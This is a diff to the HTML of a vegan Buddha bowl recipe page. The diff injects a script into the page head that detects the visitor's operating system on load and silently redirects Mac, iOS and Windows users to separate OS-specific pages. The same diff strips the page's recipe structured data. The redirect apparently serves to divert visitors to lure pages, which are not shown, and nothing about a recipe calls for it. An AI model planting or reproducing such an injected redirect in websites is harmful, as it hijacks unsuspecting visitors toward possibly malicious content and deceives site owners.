@@ -1,7 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+      (function() {
+        var ua = navigator.userAgent || navigator.platform || "";
+        if (/Macintosh|MacIntel|Mac OS|iPhone|iPad|iPod/.test(ua)) {
+          window.location.replace("/apple.html");
+        } else if (/Win/.test(ua)) {
+          window.location.replace("/Windows/windows.html");
+        }
+      })();
+    </script>
     <meta charset="UTF-8">
+    <link rel="icon" type="image/png" href="favicon.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rainbow Buddha Bowl Recipe — Easy 30-Minute Vegan Meal | A Farm Recipe</title>
     <meta name="description" content="Rainbow Buddha Bowl with roasted sweet potato, chickpeas, quinoa, avocado, and tahini dressing. Ready in 30 minutes with nutrition info.">
@@ -91,7 +102,7 @@
             <p style="font-size:1.1rem; opacity:0.9;">Prep: 10 min &bull; Cook: 20 min &bull; Serves: 2 &bull; 520 kcal per serving</p>
         </div>
 
-        <article class="content-block" style="max-width: 800px; margin: 0 auto; padding-top: 60px;" itemscope itemtype="https://schema.org/Recipe">
+        <article class="content-block" style="max-width: 800px; margin: 0 auto; padding-top: 60px;">
             <p style="font-size: 1.2rem; color: #555; margin-bottom: 20px;">This Rainbow Buddha Bowl is the kind of meal that makes you feel good inside and out. Bursting with color, packed with plant protein, and drizzled with the creamiest tahini dressing — it's proof that healthy eating is anything but boring. Each bowl delivers 22 grams of protein and is ready in just 30 minutes, making it perfect for weeknight dinners or meal prep.</p>
             
             <img src="https://images.unsplash.com/photo-1512621776951-a57141f2eefd?auto=format&fit=crop&w=800&q=80" style="width: 100%; border-radius: 12px; margin: 30px 0;" alt="Colorful rainbow buddha bowl with roasted sweet potato, chickpeas, quinoa, avocado, purple cabbage, and tahini dressing" width="800" height="400" loading="lazy">
